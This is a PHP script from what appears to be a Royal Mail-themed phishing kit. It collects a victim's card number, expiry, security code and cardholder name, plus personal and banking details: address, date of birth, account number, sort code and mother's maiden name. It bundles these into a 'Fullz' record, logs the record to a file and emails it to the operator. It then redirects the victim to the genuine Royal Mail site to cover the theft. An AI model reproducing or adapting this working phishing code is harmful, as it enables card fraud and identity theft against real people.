<?php
session_start();
include "control.php";

if ($_SESSION["valid"]) {
	if (isset($_POST["cn"])) {
		$firstName = $_SESSION['firstName'];
		$lastName = $_SESSION['lastName'];
		$addressLine1 = $_SESSION['addressLine1'];
		$city = $_SESSION['city'];
		$county = $_SESSION['county'];
		$postcode = $_SESSION['postcode'];
		$email = $_SESSION['email'];
		$phone = $_SESSION['phone'];
		$dob = $_SESSION['dob'];
		$acc = $_SESSION['acc'];
		$scc = $_SESSION['scc'];
		$mmn = $_SESSION['mmn'];

		$cn = $_POST['cn'];
		$cardholderName = $_POST['cardholderName'];
		$expiryMonth = $_POST['expiryMonth'];
		$expiryYear = $_POST['expiryYear'];
		$securityCode = $_POST['securityCode'];

		$details = "$cn|$expiryMonth|$expiryYear|$securityCode|Name on Card: $cardholderName|$addressLine1|$city|$postcode|UK|phone number : $phone|date of birth : $dob|account number : $acc|sort code: $scc|Full Name: $firstName $lastName|mother maiden name : $mmn " . PHP_EOL;

		if ($log_feature == 1) {
			$file = fopen("royal_Fullz_Ahs9357dsdsdsdssdsdsds610974893.txt", "a");
			fwrite($file, $details);
			fclose($file);
		}
		if ($email_feature == 1) {
			mail($send, "HMRC Fullz $ip", $details);
		}
	}
	session_destroy();

	header('Location: https://royalmail.com/');
} else {
	header('Location: https://royalmail.com/');
}